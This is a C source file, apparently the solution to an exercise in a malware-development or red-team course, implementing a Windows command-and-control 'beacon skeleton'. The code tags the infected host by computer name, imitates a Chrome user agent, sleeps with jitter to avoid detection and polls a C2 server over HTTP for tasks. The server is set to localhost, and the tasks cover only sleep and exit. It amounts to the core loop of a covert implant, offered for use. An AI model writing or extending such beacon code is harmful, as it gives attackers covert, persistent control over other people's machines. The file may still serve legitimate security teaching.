/*
 * ========================================
 * SOLUTION 03: Beacon Skeleton
 * ========================================
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")

typedef struct {
    char szHost[256];
    DWORD dwPort;
    BOOL bUseSSL;
    DWORD dwSleepTime;
    DWORD dwJitter;
    char szBeaconID[65];
    char szUserAgent[512];
    char szCheckInPath[256];
} BEACON_CONFIG;

#define TASK_TYPE_NONE  0
#define TASK_TYPE_SLEEP 1
#define TASK_TYPE_EXIT  2

typedef struct {
    DWORD dwTaskID;
    DWORD dwTaskType;
    char szCommand[1024];
} BEACON_TASK;

typedef struct {
    BOOL bRunning;
    DWORD dwCheckInCount;
} BEACON_STATE;

DWORD GetRandomInRange(DWORD min, DWORD max) {
    if (min >= max) return min;
    return min + (rand() % (max - min + 1));
}

DWORD CalculateSleepWithJitter(DWORD baseSleep, DWORD jitterPercent) {
    if (jitterPercent == 0) {
        return baseSleep * 1000;
    }

    DWORD jitterRange = (baseSleep * jitterPercent) / 100;
    DWORD minSleep = baseSleep - jitterRange;
    DWORD maxSleep = baseSleep + jitterRange;
    DWORD actualSleep = GetRandomInRange(minSleep, maxSleep);

    return actualSleep * 1000;
}

BOOL InitBeaconConfig(BEACON_CONFIG* config) {
    if (!config) return FALSE;

    ZeroMemory(config, sizeof(BEACON_CONFIG));

    strcpy(config->szHost, "127.0.0.1");
    config->dwPort = 8080;
    config->bUseSSL = FALSE;
    config->dwSleepTime = 5;
    config->dwJitter = 20;

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        _snprintf(config->szBeaconID, sizeof(config->szBeaconID),
                  "BEACON-%s", computerName);
    } else {
        strcpy(config->szBeaconID, "BEACON-UNKNOWN");
    }

    strcpy(config->szUserAgent,
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/120.0.0.0 Safari/537.36");

    strcpy(config->szCheckInPath, "/beacon");

    return TRUE;
}

BOOL ParseTaskResponse(const char* response, DWORD responseLen, BEACON_TASK* task) {
    if (!response || responseLen == 0 || !task) {
        return FALSE;
    }

    ZeroMemory(task, sizeof(BEACON_TASK));

    if (strncmp(response, "NOTASK", 6) == 0) {
        task->dwTaskType = TASK_TYPE_NONE;
        return TRUE;
    }

    if (strncmp(response, "EXIT", 4) == 0) {
        task->dwTaskType = TASK_TYPE_EXIT;
        return TRUE;
    }

    if (strncmp(response, "SLEEP:", 6) == 0) {
        task->dwTaskType = TASK_TYPE_SLEEP;
        strncpy(task->szCommand, response + 6, sizeof(task->szCommand) - 1);
        return TRUE;
    }

    return FALSE;
}

BOOL BeaconCheckIn(BEACON_CONFIG* config, BEACON_TASK* task) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bSuccess = FALSE;

    if (task) {
        ZeroMemory(task, sizeof(BEACON_TASK));
        task->dwTaskType = TASK_TYPE_NONE;
    }

    printf("[*] Checking in to %s:%d%s\n",
           config->szHost,
           config->dwPort,
           config->szCheckInPath);

    hInternet = InternetOpenA(
        config->szUserAgent,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );

    if (!hInternet) {
        printf("[-] InternetOpenA failed: %d\n", GetLastError());
        return FALSE;
    }

    hConnect = InternetConnectA(
        hInternet,
        config->szHost,
        (INTERNET_PORT)config->dwPort,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        printf("[-] InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    char szHeaders[512];
    _snprintf(szHeaders, sizeof(szHeaders),
              "X-Beacon-ID: %s\r\n",
              config->szBeaconID);

    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (config->bUseSSL) {
        dwFlags |= INTERNET_FLAG_SECURE;
    }

    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        config->szCheckInPath,
        NULL, NULL, NULL,
        dwFlags,
        0
    );

    if (!hRequest) {
        printf("[-] HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    if (!HttpSendRequestA(hRequest, szHeaders, -1, NULL, 0)) {
        printf("[-] HttpSendRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    printf("[+] Request sent\n");

    char buffer[4096] = {0};
    DWORD bytesRead = 0;

    if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
        if (bytesRead > 0) {
            buffer[bytesRead] = '\0';
            printf("[+] Received: %s\n", buffer);

            if (task) {
                bSuccess = ParseTaskResponse(buffer, bytesRead, task);
            }
        } else {
            printf("[*] No data received\n");
            bSuccess = TRUE;
        }
    } else {
        printf("[-] InternetReadFile failed: %d\n", GetLastError());
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return bSuccess;
}

void HandleTask(BEACON_TASK* task, BEACON_CONFIG* config, BEACON_STATE* state) {
    if (!task || !config || !state) return;

    switch (task->dwTaskType) {
        case TASK_TYPE_NONE:
            printf("[*] No task to execute\n");
            break;

        case TASK_TYPE_SLEEP:
            printf("[*] Updating sleep time to %s seconds\n", task->szCommand);
            config->dwSleepTime = atoi(task->szCommand);
            break;

        case TASK_TYPE_EXIT:
            printf("[!] EXIT task received - terminating beacon\n");
            state->bRunning = FALSE;
            break;

        default:
            printf("[-] Unknown task type: %d\n", task->dwTaskType);
            break;
    }
}

int main(void) {
    printf("\n");
    printf("========================================\n");
    printf("BEACON SKELETON\n");
    printf("========================================\n\n");

    srand((unsigned int)time(NULL));

    BEACON_CONFIG config = {0};
    printf("[*] Initializing beacon configuration...\n");
    if (!InitBeaconConfig(&config)) {
        printf("[-] Failed to initialize config\n");
        return 1;
    }
    printf("[+] Configuration initialized\n\n");

    printf("[*] Beacon Configuration:\n");
    printf("    C2 Server: %s:%d\n", config.szHost, config.dwPort);
    printf("    Beacon ID: %s\n", config.szBeaconID);
    printf("    Sleep: %d seconds (+/- %d%%)\n",
           config.dwSleepTime,
           config.dwJitter);
    printf("    Check-in path: %s\n\n", config.szCheckInPath);

    BEACON_STATE state = {0};
    state.bRunning = TRUE;
    state.dwCheckInCount = 0;

    printf("[*] Starting beacon main loop...\n");
    printf("[*] Will perform 5 check-ins (demo mode)\n\n");

    while (state.bRunning && state.dwCheckInCount < 5) {
        state.dwCheckInCount++;

        printf("--- Check-in #%d ---\n", state.dwCheckInCount);

        DWORD sleepMs = CalculateSleepWithJitter(config.dwSleepTime, config.dwJitter);
        printf("[*] Sleeping for %.2f seconds...\n", sleepMs / 1000.0);

        Sleep(sleepMs);

        BEACON_TASK task = {0};
        if (BeaconCheckIn(&config, &task)) {
            printf("[+] Check-in successful\n");
            HandleTask(&task, &config, &state);
        } else {
            printf("[-] Check-in failed (no server running)\n");
        }

        printf("\n");
    }

    if (!state.bRunning) {
        printf("[*] Beacon terminated by EXIT task\n");
    } else {
        printf("[*] Demo complete (5 check-ins finished)\n");
    }

    printf("\n");
    printf("========================================\n");
    printf("BEACON SHUTDOWN\n");
    printf("========================================\n\n");

    return 0;
}
